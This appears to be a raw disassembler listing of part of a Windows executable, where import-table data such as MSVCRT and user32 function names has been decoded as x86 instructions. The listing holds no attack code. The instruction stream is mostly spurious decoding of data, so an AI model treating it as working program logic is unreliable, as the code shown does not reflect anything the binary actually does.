  413674:	jmp    0x13d:0xf800013d
  41367b:	add    BYTE PTR [esi],al
  41367d:	add    DWORD PTR ds:[eax],eax
  413680:	sbb    al,0x3e
  413682:	add    DWORD PTR [eax],eax
  413684:	sub    bh,BYTE PTR [esi]
  413686:	add    DWORD PTR [eax],eax
  413688:	cmp    al,0x3e
  41368a:	add    DWORD PTR [eax],eax
  41368c:	dec    eax
  41368d:	add    DWORD PTR ds:[eax],eax
  413690:	pop    esp
  413691:	add    DWORD PTR ds:[eax],eax
  413694:	ins    BYTE PTR es:[edi],dx
  413695:	add    DWORD PTR ds:[eax],eax
  413698:	jl     0x4136d8
  41369a:	add    DWORD PTR [eax],eax
  41369c:	mov    BYTE PTR [esi],bh
  41369e:	add    DWORD PTR [eax],eax
  4136a0:	cwde   
  4136a1:	add    DWORD PTR ds:[eax],eax
  4136a4:	lods   al,BYTE PTR ds:[esi]
  4136a5:	add    DWORD PTR ds:[eax],eax
  4136a8:	mov    edx,0xcc00013e
  4136ad:	add    DWORD PTR ds:[eax],eax
  4136b0:	fidivr DWORD PTR [esi]
  4136b2:	add    DWORD PTR [eax],eax
  4136b4:	lock add DWORD PTR ds:[eax],eax
  4136b8:	(bad)  
  4136b9:	add    DWORD PTR ds:[eax],eax
  4136bc:	push   cs
  4136bd:	aas    
  4136be:	add    DWORD PTR [eax],eax
  4136c0:	sbb    bh,BYTE PTR [edi]
  4136c2:	add    DWORD PTR [eax],eax
  4136c4:	sub    bh,BYTE PTR [edi]
  4136c6:	add    DWORD PTR [eax],eax
  4136c8:	cmp    BYTE PTR [edi],bh
  4136ca:	add    DWORD PTR [eax],eax
  4136cc:	dec    esi
  4136cd:	aas    
  4136ce:	add    DWORD PTR [eax],eax
  4136d0:	bound  edi,QWORD PTR [edi]
  4136d2:	add    DWORD PTR [eax],eax
  4136d4:	outs   dx,BYTE PTR ds:[esi]
  4136d5:	aas    
  4136d6:	add    DWORD PTR [eax],eax
  4136d8:	js     0x413719
  4136da:	add    DWORD PTR [eax],eax
  4136dc:	xchg   BYTE PTR [edi],bh
  4136de:	add    DWORD PTR [eax],eax
  4136e0:	xchg   esp,eax
  4136e1:	aas    
  4136e2:	add    DWORD PTR [eax],eax
  4136e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e5:	aas    
  4136e6:	add    DWORD PTR [eax],eax
  4136e8:	mov    dh,0x3f
  4136ea:	add    DWORD PTR [eax],eax
  4136ec:	enter  0x13f,0x0
  4136f0:	fidivr DWORD PTR [edi]
  4136f2:	add    DWORD PTR [eax],eax
  4136f4:	in     al,dx
  4136f5:	aas    
  4136f6:	add    DWORD PTR [eax],eax
  4136f8:	clc    
  4136f9:	aas    
  4136fa:	add    DWORD PTR [eax],eax
  4136fc:	or     al,BYTE PTR [eax+0x1]
  4136ff:	add    BYTE PTR [edx],ah
  413701:	inc    eax
  413702:	add    DWORD PTR [eax],eax
  413704:	xor    al,0x40
  413706:	add    DWORD PTR [eax],eax
  413708:	dec    eax
  413709:	inc    eax
  41370a:	add    DWORD PTR [eax],eax
  41370c:	pop    edx
  41370d:	inc    eax
  41370e:	add    DWORD PTR [eax],eax
  413710:	fs inc eax
  413712:	add    DWORD PTR [eax],eax
  413714:	je     0x413756
  413716:	add    DWORD PTR [eax],eax
  413718:	add    BYTE PTR [eax+0x1],0x0
  41371c:	cwde   
  41371d:	inc    eax
  41371e:	add    DWORD PTR [eax],eax
  413720:	lods   al,BYTE PTR ds:[esi]
  413721:	inc    eax
  413722:	add    DWORD PTR [eax],eax
  413724:	mov    esp,0xca000140
  413729:	inc    eax
  41372a:	add    DWORD PTR [eax],eax
  41372c:	loopne 0x41376e
  41372e:	add    DWORD PTR [eax],eax
  413730:	lock inc eax
  413732:	add    DWORD PTR [eax],eax
  413734:	or     BYTE PTR [ecx+0x1],al
  413737:	add    BYTE PTR [esi],dl
  413739:	inc    ecx
  41373a:	add    DWORD PTR [eax],eax
  41373c:	sub    BYTE PTR [ecx+0x1],al
  41373f:	add    BYTE PTR [esi],dh
  413741:	inc    ecx
  413742:	add    DWORD PTR [eax],eax
  413744:	inc    esp
  413745:	inc    ecx
  413746:	add    DWORD PTR [eax],eax
  413748:	push   edx
  413749:	inc    ecx
  41374a:	add    DWORD PTR [eax],eax
  41374c:	pusha  
  41374d:	inc    ecx
  41374e:	add    DWORD PTR [eax],eax
  413750:	jo     0x413793
  413752:	add    DWORD PTR [eax],eax
  413754:	test   BYTE PTR [ecx+0x1],al
  413757:	add    BYTE PTR [edx-0x5ffffebf],dl
  41375d:	inc    ecx
  41375e:	add    DWORD PTR [eax],eax
  413760:	scas   al,BYTE PTR es:[edi]
  413761:	inc    ecx
  413762:	add    DWORD PTR [eax],eax
  413764:	mov    esi,0xd6000141
  413769:	inc    ecx
  41376a:	add    DWORD PTR [eax],eax
  41376c:	call   0xfa4138b2
  413771:	inc    ecx
  413772:	add    DWORD PTR [eax],eax
  413774:	push   es
  413775:	inc    edx
  413776:	add    DWORD PTR [eax],eax
  413778:	sbb    BYTE PTR [edx+0x1],al
  41377b:	add    BYTE PTR [esi],ch
  41377d:	inc    edx
  41377e:	add    DWORD PTR [eax],eax
  413780:	cmp    al,BYTE PTR [edx+0x1]
  413783:	add    BYTE PTR [esi+0x42],cl
  413786:	add    DWORD PTR [eax],eax
  413788:	pusha  
  413789:	inc    edx
  41378a:	add    DWORD PTR [eax],eax
  41378c:	add    BYTE PTR [eax],al
  41378e:	add    BYTE PTR [eax],al
  413790:	add    BYTE PTR [edx+0x1],0x0
  413794:	cwde   
  413795:	inc    edx
  413796:	add    DWORD PTR [eax],eax
  413798:	scas   al,BYTE PTR es:[edi]
  413799:	inc    edx
  41379a:	add    DWORD PTR [eax],eax
  41379c:	mov    edx,0xca000142
  4137a1:	inc    edx
  4137a2:	add    DWORD PTR [eax],eax
  4137a4:	fadd   QWORD PTR [edx+0x1]
  4137a7:	add    ah,ch
  4137a9:	inc    edx
  4137aa:	add    DWORD PTR [eax],eax
  4137ac:	clc    
  4137ad:	inc    edx
  4137ae:	add    DWORD PTR [eax],eax
  4137b0:	push   cs
  4137b1:	inc    ebx
  4137b2:	add    DWORD PTR [eax],eax
  4137b4:	sbb    BYTE PTR [ebx+0x1],al
  4137b7:	add    BYTE PTR [ebx+eax*2],ah
  4137ba:	add    DWORD PTR [eax],eax
  4137bc:	xor    al,BYTE PTR [ebx+0x1]
  4137bf:	add    BYTE PTR [edx+0x43],al
  4137c2:	add    DWORD PTR [eax],eax
  4137c4:	push   eax
  4137c5:	inc    ebx
  4137c6:	add    DWORD PTR [eax],eax
  4137c8:	pop    edx
  4137c9:	inc    ebx
  4137ca:	add    DWORD PTR [eax],eax
  4137cc:	outs   dx,BYTE PTR ds:[esi]
  4137cd:	inc    ebx
  4137ce:	add    DWORD PTR [eax],eax
  4137d0:	test   BYTE PTR [ebx+0x1],al
  4137d3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4137da:	add    DWORD PTR [eax],eax
  4137dc:	mov    eax,0xcc000143
  4137e1:	inc    ebx
  4137e2:	add    DWORD PTR [eax],eax
  4137e4:	fiadd  DWORD PTR [ebx+0x1]
  4137e7:	add    dl,ch
  4137e9:	inc    ebx
  4137ea:	add    DWORD PTR [eax],eax
  4137ec:	clc    
  4137ed:	inc    ebx
  4137ee:	add    DWORD PTR [eax],eax
  4137f0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4137f4:	adc    al,0x44
  4137f6:	add    DWORD PTR [eax],eax
  4137f8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4137fc:	xor    al,0x44
  4137fe:	add    DWORD PTR [eax],eax
  413800:	inc    esi
  413801:	inc    esp
  413802:	add    DWORD PTR [eax],eax
  413804:	pop    edx
  413805:	inc    esp
  413806:	add    DWORD PTR [eax],eax
  413808:	inc    sp
  41380a:	add    DWORD PTR [eax],eax
  41380c:	jbe    0x413852
  41380e:	add    DWORD PTR [eax],eax
  413810:	mov    es,WORD PTR [ecx+eax*1+0x0]
  413814:	sahf   
  413815:	inc    esp
  413816:	add    DWORD PTR [eax],eax
  413818:	scas   al,BYTE PTR es:[edi]
  413819:	inc    esp
  41381a:	add    DWORD PTR [eax],eax
  41381c:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413821:	inc    esp
  413822:	add    DWORD PTR [eax],eax
  413824:	in     al,dx
  413825:	inc    esp
  413826:	add    DWORD PTR [eax],eax
  413828:	clc    
  413829:	inc    esp
  41382a:	add    DWORD PTR [eax],eax
  41382c:	or     al,BYTE PTR [ebp+0x1]
  41382f:	add    BYTE PTR [esi],bl
  413831:	inc    ebp
  413832:	add    DWORD PTR [eax],eax
  413834:	sub    BYTE PTR [ebp+0x1],al
  413837:	add    BYTE PTR [eax],bh
  413839:	inc    ebp
  41383a:	add    DWORD PTR [eax],eax
  41383c:	inc    esp
  41383d:	inc    ebp
  41383e:	add    DWORD PTR [eax],eax
  413840:	dec    esi
  413841:	inc    ebp
  413842:	add    DWORD PTR [eax],eax
  413844:	pop    edx
  413845:	inc    ebp
  413846:	add    DWORD PTR [eax],eax
  413848:	add    BYTE PTR [eax],al
  41384a:	add    BYTE PTR [eax],al
  41384c:	jbe    0x413893
  41384e:	add    DWORD PTR [eax],eax
  413850:	mov    BYTE PTR [ebp+0x1],al
  413853:	add    BYTE PTR [eax-0x51fffebb],ah
  413859:	inc    ebp
  41385a:	add    DWORD PTR [eax],eax
  41385c:	retf   0x145
  41385f:	add    ah,bl
  413861:	inc    ebp
  413862:	add    DWORD PTR [eax],eax
  413864:	in     al,dx
  413865:	inc    ebp
  413866:	add    DWORD PTR [eax],eax
  413868:	add    BYTE PTR [esi+0x1],al
  41386b:	add    BYTE PTR [eax],bl
  41386d:	inc    esi
  41386e:	add    DWORD PTR [eax],eax
  413870:	sub    al,BYTE PTR [esi+0x1]
  413873:	add    BYTE PTR [esi],dh
  413875:	inc    esi
  413876:	add    DWORD PTR [eax],eax
  413878:	dec    edx
  413879:	inc    esi
  41387a:	add    DWORD PTR [eax],eax
  41387c:	pusha  
  41387d:	inc    esi
  41387e:	add    DWORD PTR [eax],eax
  413880:	ins    BYTE PTR es:[edi],dx
  413881:	inc    esi
  413882:	add    DWORD PTR [eax],eax
  413884:	add    BYTE PTR [esi+0x1],0x0
  413888:	xchg   esp,eax
  413889:	inc    esi
  41388a:	add    DWORD PTR [eax],eax
  41388c:	mov    al,ds:0xae000146
  413891:	inc    esi
  413892:	add    DWORD PTR [eax],eax
  413894:	ret    0x146
  413897:	add    dl,bl
  413899:	inc    esi
  41389a:	add    DWORD PTR [eax],eax
  41389c:	call   0xf24139e7
  4138a1:	inc    esi
  4138a2:	add    DWORD PTR [eax],eax
  4138a4:	inc    BYTE PTR [esi+0x1]
  4138a7:	add    BYTE PTR [esi],cl
  4138a9:	inc    edi
  4138aa:	add    DWORD PTR [eax],eax
  4138ac:	and    al,0x47
  4138ae:	add    DWORD PTR [eax],eax
  4138b0:	cmp    al,BYTE PTR [edi+0x1]
  4138b3:	add    BYTE PTR [edi+eax*2+0x1],cl
  4138b7:	add    BYTE PTR [edx+0x47],bl
  4138ba:	add    DWORD PTR [eax],eax
  4138bc:	push   0x47
  4138be:	add    DWORD PTR [eax],eax
  4138c0:	jle    0x413909
  4138c2:	add    DWORD PTR [eax],eax
  4138c4:	xchg   esi,eax
  4138c5:	inc    edi
  4138c6:	add    DWORD PTR [eax],eax
  4138c8:	mov    ds:0xba000147,al
  4138cd:	inc    edi
  4138ce:	add    DWORD PTR [eax],eax
  4138d0:	int3   
  4138d1:	inc    edi
  4138d2:	add    DWORD PTR [eax],eax
  4138d4:	fadd   QWORD PTR [edi+0x1]
  4138d7:	add    al,dh
  4138d9:	inc    edi
  4138da:	add    DWORD PTR [eax],eax
  4138dc:	push   es
  4138dd:	dec    eax
  4138de:	add    DWORD PTR [eax],eax
  4138e0:	sbb    cl,BYTE PTR [eax+0x1]
  4138e3:	add    BYTE PTR [eax],ch
  4138e5:	dec    eax
  4138e6:	add    DWORD PTR [eax],eax
  4138e8:	cmp    cl,BYTE PTR [eax+0x1]
  4138eb:	add    BYTE PTR [eax+0x48],cl
  4138ee:	add    DWORD PTR [eax],eax
  4138f0:	push   esp
  4138f1:	dec    eax
  4138f2:	add    DWORD PTR [eax],eax
  4138f4:	outs   dx,BYTE PTR ds:[esi]
  4138f5:	dec    eax
  4138f6:	add    DWORD PTR [eax],eax
  4138f8:	mov    BYTE PTR [eax+0x1],cl
  4138fb:	add    BYTE PTR [eax-0x59fffeb8],bl
  413901:	dec    eax
  413902:	add    DWORD PTR [eax],eax
  413904:	mov    dl,0x48
  413906:	add    DWORD PTR [eax],eax
  413908:	ror    BYTE PTR [eax+0x1],0x0
  41390c:	(bad)  
  41390d:	dec    eax
  41390e:	add    DWORD PTR [eax],eax
  413910:	add    BYTE PTR [eax],al
  413912:	add    BYTE PTR [eax],al
  413914:	lock dec eax
  413916:	add    DWORD PTR [eax],eax
  413918:	dec    BYTE PTR [eax+0x1]
  41391b:	add    BYTE PTR [esi],cl
  41391d:	dec    ecx
  41391e:	add    DWORD PTR [eax],eax
  413920:	push   ds
  413921:	dec    ecx
  413922:	add    DWORD PTR [eax],eax
  413924:	cs dec ecx
  413926:	add    DWORD PTR [eax],eax
  413928:	add    BYTE PTR [eax],al
  41392a:	add    BYTE PTR [eax],al
  41392c:	push   eax
  41392d:	dec    ecx
  41392e:	add    DWORD PTR [eax],eax
  413930:	add    BYTE PTR [eax],al
  413932:	add    BYTE PTR [eax],al
  413934:	cmc    
  413935:	add    BYTE PTR [edi+0x63],bl
  413938:	outs   dx,DWORD PTR ds:[esi]
  413939:	outs   dx,BYTE PTR ds:[esi]
  41393a:	je     0x4139ae
  41393c:	outs   dx,DWORD PTR ds:[esi]
  41393d:	ins    BYTE PTR es:[edi],dx
  41393e:	data16 jo 0x413941
  413941:	add    BYTE PTR [ebp+0x3],bl
  413944:	arpl   WORD PTR [ecx+0x6c],sp
  413947:	ins    BYTE PTR es:[edi],dx
  413948:	outs   dx,DWORD PTR ds:[esi]
  413949:	arpl   WORD PTR [eax],ax
  41394b:	add    BYTE PTR [edx+0x3],dh
  41394e:	data16 ins BYTE PTR es:[edi],dx
  413950:	outs   dx,DWORD PTR ds:[esi]
  413951:	outs   dx,DWORD PTR ds:[esi]
  413952:	jb     0x413954
  413954:	push   ds
  413955:	add    al,0x77
  413957:	arpl   WORD PTR [ebx+0x63],si
  41395a:	push   0xb000072
  41395f:	add    al,0x74
  413961:	outs   dx,DWORD PTR ds:[esi]
  413962:	ja     0x4139d0
  413964:	outs   dx,DWORD PTR ds:[esi]
  413965:	ja     0x4139cc
  413967:	jb     0x413969
  413969:	add    BYTE PTR [ebx+0x735f5f00],dh
  41396f:	gs je  0x4139d1
  413972:	popa   
  413973:	jo     0x4139e5
  413975:	pop    edi
  413976:	je     0x4139f1
  413978:	jo     0x4139df
  41397a:	add    BYTE PTR [eax],al
  41397c:	in     eax,0x3
  41397e:	jae    0x4139f4
  413980:	jb     0x4139e5
  413982:	push   0xa0000072
  413987:	add    BYTE PTR [edi+0x5f],bl
  41398a:	jo     0x4139eb
  41398c:	pop    edi
  41398d:	ins    WORD PTR es:[edi],dx
  41398f:	outs   dx,DWORD PTR ds:[esi]
  413990:	fs add BYTE PTR gs:[eax],al
  413994:	int3   
  413995:	add    esi,DWORD PTR [ecx+0x73]
  413998:	outs   dx,DWORD PTR ds:[esi]
  413999:	jb     0x413a0f
  41399b:	add    BYTE PTR [ebx+0x77736903],ch
  4139a1:	js     0x413a07
  4139a3:	imul   esp,DWORD PTR [edi+0x69],0x3a00074
  4139aa:	imul   esi,DWORD PTR [ebx+0x77],0x68706c61
  4139b1:	popa   
  4139b2:	add    BYTE PTR [eax],al
  4139b4:	fwait
  4139b5:	add    BYTE PTR [edi+0x5f],bl
  4139b8:	jo     0x413a19
  4139ba:	pop    edi
  4139bb:	arpl   WORD PTR [edi+0x6d],bp
  4139be:	ins    DWORD PTR es:[edi],dx
  4139bf:	outs   dx,DWORD PTR ds:[esi]
  4139c0:	fs add BYTE PTR gs:[eax],al
  4139c4:	sub    BYTE PTR [edi+esi*2],al
  4139c7:	arpl   WORD PTR [ebx+0x6e],si
  4139ca:	arpl   WORD PTR [ebp+0x70],bp
  4139cd:	add    BYTE PTR [ebp+0x3],bh
  4139d0:	data16 jb 0x413a38
  4139d3:	add    BYTE PTR gs:[eax],al
  4139d6:	or     al,0x4
  4139d8:	je     0x413a49
  4139da:	ja     0x413a51
  4139dc:	jo     0x413a4e
  4139de:	gs jb  0x4139e1
  4139e1:	add    BYTE PTR [ecx+0x3],bh
  4139e4:	data16 jo 0x413a5c
  4139e7:	je     0x413a5c
  4139e9:	add    BYTE PTR [ebp+0x74656703],cl
  4139ef:	outs   dx,BYTE PTR gs:[esi]
  4139f1:	jbe    0x4139f3
  4139f3:	add    BYTE PTR [eax+0x3],ah
  4139f6:	arpl   WORD PTR [edi+ebp*2+0x63],bp
  4139fa:	imul   eax,DWORD PTR [eax],0xffffffff
  4139fd:	add    esi,DWORD PTR [ebx+0x77]
  413a00:	jo     0x413a74
  413a02:	imul   ebp,DWORD PTR [esi+0x74],0xc8000066
  413a09:	add    esi,DWORD PTR [eax+0x75]
  413a0c:	je     0x413a71
  413a0e:	push   0xc9007261
  413a13:	add    esi,DWORD PTR [eax+0x75]
  413a16:	je     0x413a8b
  413a18:	add    BYTE PTR [eax],al
  413a1a:	mov    ecx,0x74626d03
  413a1f:	outs   dx,DWORD PTR ds:[esi]
  413a20:	ja     0x413a85
  413a22:	add    BYTE PTR [eax],al
  413a24:	test   eax,0x77736903
  413a29:	jae    0x413a9b
  413a2b:	popa   
  413a2c:	arpl   WORD PTR [ebp+0x0],sp
  413a2f:	add    BYTE PTR [ecx],cl
  413a31:	add    al,0x74
  413a33:	outs   dx,DWORD PTR ds:[esi]
  413a34:	ins    BYTE PTR es:[edi],dx
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	ja     0x413a9d
  413a38:	jb     0x413a3a
  413a3a:	fild   DWORD PTR [eax]
  413a3c:	pop    edi
  413a3d:	popa   
  413a3e:	ins    DWORD PTR es:[edi],dx
  413a3f:	jae    0x413aa8
  413a41:	pop    edi
  413a42:	gs js  0x413aae
  413a45:	je     0x413a47
  413a47:	add    ch,al
  413a49:	add    esi,DWORD PTR [eax+0x72]
  413a4c:	imul   ebp,DWORD PTR [esi+0x74],0x86000066
  413a53:	add    DWORD PTR [edi+0x69],ebx
  413a56:	outs   dx,BYTE PTR ds:[esi]
  413a57:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x9e006d72
  413a5f:	add    DWORD PTR [edi+0x69],ebx
  413a62:	jae    0x413ad1
  413a64:	bound  esp,QWORD PTR [edx+0x6c]
  413a67:	gs popa 
  413a69:	add    BYTE PTR fs:[eax],al
  413a6c:	push   edx
  413a6d:	add    BYTE PTR [edi+0x58],bl
  413a70:	arpl   WORD PTR [eax+0x74],si
  413a73:	inc    esi
  413a74:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3f10072
  413a7c:	jae    0x413af2
  413a7e:	jb     0x413aee
  413a80:	arpl   WORD PTR [ebp+0x70],bp
  413a83:	add    dl,dl
  413a85:	add    esi,DWORD PTR [edx+0x65]
  413a88:	ins    DWORD PTR es:[edi],dx
  413a89:	outs   dx,DWORD PTR ds:[esi]
  413a8a:	jbe    0x413af1
  413a8c:	add    BYTE PTR [eax],al
  413a8e:	cld    
  413a8f:	add    esi,DWORD PTR [ebx+0x74]
  413a92:	jb     0x413b08
  413a94:	outs   dx,DWORD PTR ds:[esi]
  413a95:	ins    BYTE PTR es:[edi],dx
  413a96:	add    BYTE PTR [eax],al
  413a98:	and    eax,0x73637704
  413a9d:	ins    BYTE PTR es:[edi],dx
  413a9e:	outs   dx,BYTE PTR gs:[esi]
  413aa0:	add    BYTE PTR [eax],al
  413aa2:	and    eax,DWORD PTR [ecx]
  413aa4:	pop    edi
  413aa5:	gs js  0x413b11
  413aa8:	je     0x413aaa
  413aaa:	call   0x65a499af
  413aaf:	js     0x413b1a
  413ab1:	je     0x413ab3
  413ab3:	add    BYTE PTR [ebp+0x73736903],bl
  413ab9:	jo     0x413b1c
  413abb:	arpl   WORD PTR [ebp+0x0],sp
  413abe:	call   0x72b5adc6
  413ac3:	arpl   WORD PTR [eax+0x79],si
  413ac6:	add    BYTE PTR [eax],al
  413ac8:	mov    ch,0x0
  413aca:	pop    edi
  413acb:	pop    edi
  413acc:	jae    0x413b33
  413ace:	je     0x413b45
  413ad0:	jae    0x413b37
  413ad2:	jb     0x413b41
  413ad4:	popa   
  413ad5:	je     0x413b3f
  413ad7:	gs jb  0x413b4c
  413ada:	add    BYTE PTR [eax],al
  413adc:	repnz add esi,DWORD PTR [ebx+0x74]
  413ae0:	jb     0x413b50
  413ae2:	arpl   WORD PTR [eax+0x79],si
  413ae5:	add    BYTE PTR [ebx+eax*1+0x64777369],ah
  413aec:	imul   esp,DWORD PTR [edi+0x69],0xa3000074
  413af3:	add    ebp,DWORD PTR [ecx+0x73]
  413af6:	ja     0x413b5b
  413af8:	je     0x413b73
  413afa:	jo     0x413b61
  413afc:	add    BYTE PTR [eax],al
  413afe:	mov    ch,0x3
  413b00:	ins    DWORD PTR es:[edi],dx
  413b01:	popa   
  413b02:	ins    BYTE PTR es:[edi],dx
  413b03:	ins    BYTE PTR es:[edi],dx
  413b04:	outs   dx,DWORD PTR ds:[esi]
  413b05:	arpl   WORD PTR [eax],ax
  413b07:	add    BYTE PTR [edx+0x0],dh
  413b0a:	pop    edi
  413b0b:	pop    edi
  413b0c:	addr16 gs je 0x413b7d
  413b10:	popa   
  413b11:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413b18:	add    DWORD PTR [ebx+esi*2],eax
  413b1b:	ja     0x413b90
  413b1d:	arpl   WORD PTR [ecx+0x6e],sp
  413b20:	data16 add BYTE PTR [ebp+0x53],cl
  413b24:	push   esi
  413b25:	inc    ebx
  413b26:	push   edx
  413b27:	push   esp
  413b28:	cs fs ins BYTE PTR es:[edi],dx
  413b2b:	ins    BYTE PTR es:[edi],dx
  413b2c:	add    BYTE PTR [eax],al
  413b2e:	xor    eax,0x74654701
  413b33:	dec    ebp
  413b34:	outs   dx,BYTE PTR gs:[esi]
  413b36:	jne    0x413b81
  413b38:	je     0x413b9f
  413b3a:	ins    DWORD PTR es:[edi],dx
  413b3b:	dec    ecx
  413b3c:	outs   dx,BYTE PTR ds:[esi]
  413b3d:	outs   dx,WORD PTR ds:[esi]
  413b3f:	push   edi
  413b40:	add    BYTE PTR [eax],al
  413b42:	sub    BYTE PTR [ecx],al
  413b44:	inc    edi
  413b45:	gs je  0x413b94
  413b48:	popa   
  413b49:	jae    0x413bbf
  413b4b:	inc    ecx
  413b4c:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  413b50:	gs push eax
  413b52:	outs   dx,DWORD PTR ds:[esi]
  413b53:	jo     0x413bca
  413b55:	jo     0x413b57
  413b57:	add    dl,ah
  413b59:	add    BYTE PTR [esi+0x69],al
  413b5c:	outs   dx,BYTE PTR ds:[esi]
  413b5d:	fs push edi
  413b5f:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [ebp+0x1],bh
  413b6a:	dec    eax
  413b6b:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x74657261
  413b73:	add    BYTE PTR [esi+0x1],ah
  413b76:	inc    edi
  413b77:	gs je  0x413bcf
  413b7a:	jae    0x413be1
  413b7c:	jb     0x413bcd
  413b7e:	bound  ebp,QWORD PTR [edx+0x65]
  413b81:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  413b85:	outs   dx,WORD PTR ds:[esi]
  413b87:	jb     0x413bf6
  413b89:	popa   
  413b8a:	je     0x413bf5
  413b8c:	outs   dx,DWORD PTR ds:[esi]
  413b8d:	outs   dx,BYTE PTR ds:[esi]
  413b8e:	push   edi
  413b8f:	add    ch,bl
  413b91:	add    BYTE PTR [ebp+0x71],al
  413b94:	jne    0x413bf7
  413b96:	ins    BYTE PTR es:[edi],dx
  413b97:	push   edx
  413b98:	arpl   WORD PTR gs:[eax+eax*1-0x6c],si
  413b9d:	add    dl,BYTE PTR [edx+esi*2+0x61]
  413ba1:	outs   dx,BYTE PTR ds:[esi]
  413ba2:	jae    0x413c10
  413ba4:	popa   
  413ba5:	je     0x413c0c
  413ba7:	inc    ecx
  413ba8:	arpl   WORD PTR [ebx+0x65],sp
  413bab:	ins    BYTE PTR es:[edi],dx
  413bac:	gs jb  0x413c10
  413baf:	je     0x413c20
  413bb1:	jb     0x413c0a
  413bb3:	add    BYTE PTR [esi],bh
  413bb5:	add    BYTE PTR [ebx+0x68],al
  413bb8:	imul   ebp,DWORD PTR [esp+eiz*2+0x57],0x6f646e69
  413bc0:	ja     0x413c08
  413bc2:	jb     0x413c33
  413bc4:	ins    DWORD PTR es:[edi],dx
  413bc5:	push   eax
  413bc6:	outs   dx,DWORD PTR ds:[esi]
  413bc7:	imul   ebp,DWORD PTR [esi+0x74],0x28a0000
  413bce:	push   esp
  413bcf:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  413bd7:	ja     0x413c4c
  413bd9:	add    BYTE PTR [esi+0x616f4c01],dh
  413bdf:	fs dec ebp
  413be1:	outs   dx,BYTE PTR gs:[esi]
  413be3:	jne    0x413c26
  413be5:	add    al,al
  413be7:	add    BYTE PTR [ebp+0x6e],al
  413bea:	popa   
  413beb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  413bef:	arpl   WORD PTR [edx+0x6f],si
  413bf2:	ins    BYTE PTR es:[edi],dx
  413bf3:	ins    BYTE PTR es:[edi],dx
  413bf4:	inc    edx
  413bf5:	popa   
  413bf6:	jb     0x413bf8
  413bf8:	xor    al,BYTE PTR [ecx]
  413bfa:	inc    edi
  413bfb:	gs je  0x413c4b
  413bfe:	outs   dx,BYTE PTR gs:[esi]
  413c00:	jne    0x413c4b
  413c02:	je     0x413c69
  413c04:	ins    DWORD PTR es:[edi],dx
  413c05:	inc    ebx
  413c06:	outs   dx,DWORD PTR ds:[esi]
  413c07:	jne    0x413c77
  413c09:	je     0x413c0b
  413c0b:	add    cl,ah
  413c0d:	add    BYTE PTR [esi+0x69],al
  413c10:	outs   dx,BYTE PTR ds:[esi]
  413c11:	fs push edi
  413c13:	imul   ebp,DWORD PTR [esi+0x64],0x41776f
  413c1a:	rol    BYTE PTR [ecx],1
  413c1c:	dec    ebp
  413c1d:	gs jae 0x413c93
  413c20:	popa   
  413c21:	addr16 gs inc edx
  413c24:	outs   dx,DWORD PTR ds:[esi]
  413c25:	js     0x413c6c
  413c27:	js     0x413c80
  413c29:	add    BYTE PTR [eax+0x536e4901],al
  413c2f:	outs   dx,BYTE PTR gs:[esi]
  413c31:	fs dec ebp
  413c33:	gs jae 0x413ca9
  413c36:	popa   
  413c37:	addr16 gs add al,bl
  413c3b:	add    DWORD PTR [ebp+0x6f],ecx
  413c3e:	outs   dx,BYTE PTR ds:[esi]
  413c3f:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  413c47:	push   eax
  413c48:	outs   dx,DWORD PTR ds:[esi]
  413c49:	imul   ebp,DWORD PTR [esi+0x74],0x1680000
  413c50:	inc    edi
  413c51:	gs je  0x413cab
  413c54:	imul   ebp,DWORD PTR [esi+0x64],0x7d00776f
  413c5b:	add    dl,BYTE PTR [ebx+0x68]
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	ja     0x413cb4
  413c61:	arpl   WORD PTR [edx+0x6f],si
  413c64:	ins    BYTE PTR es:[edi],dx
  413c65:	ins    BYTE PTR es:[edi],dx
  413c66:	inc    edx
  413c67:	popa   
  413c68:	jb     0x413c6a
  413c6a:	mov    cl,0x1
  413c6c:	dec    esp
  413c6d:	outs   dx,DWORD PTR ds:[esi]
  413c6e:	popa   
  413c6f:	fs dec ecx
  413c71:	ins    DWORD PTR es:[edi],dx
  413c72:	popa   
  413c73:	addr16 gs inc ecx
  413c76:	add    BYTE PTR [eax],al
  413c78:	cdq    
  413c79:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413c7d:	ins    BYTE PTR es:[edi],dx
  413c7e:	outs   dx,DWORD PTR ds:[esi]
  413c7f:	addr16 inc edx
  413c81:	outs   dx,DWORD PTR ds:[esi]
  413c82:	js     0x413ccd
  413c84:	outs   dx,BYTE PTR ds:[esi]
  413c85:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  413c8d:	jb     0x413cf0
  413c8f:	ins    DWORD PTR es:[edi],dx
  413c90:	inc    ecx
  413c91:	add    ch,al
  413c93:	add    DWORD PTR [ebp+0x61],ecx
  413c96:	jo     0x413cee
  413c98:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413c9f:	gs jns 0x413ce3
  413ca2:	add    BYTE PTR [eax],al
  413ca4:	sbb    BYTE PTR [edx],al
  413ca6:	push   edx
  413ca7:	gs ins DWORD PTR es:[edi],dx
  413ca9:	outs   dx,DWORD PTR ds:[esi]
  413caa:	jbe    0x413d11
  413cac:	push   eax
  413cad:	jb     0x413d1e
  413caf:	jo     0x413d08
  413cb1:	add    BYTE PTR [ecx+eax*1+0x47],ah
  413cb5:	gs je  0x413d0d
  413cb8:	jo     0x413d1e
  413cba:	popa   
  413cbb:	je     0x413d22
  413cbd:	push   edx
  413cbe:	outs   dx,BYTE PTR ds:[si]
  413cc0:	add    BYTE PTR [eax],al
  413cc2:	add    al,BYTE PTR [edx]
  413cc4:	push   edx
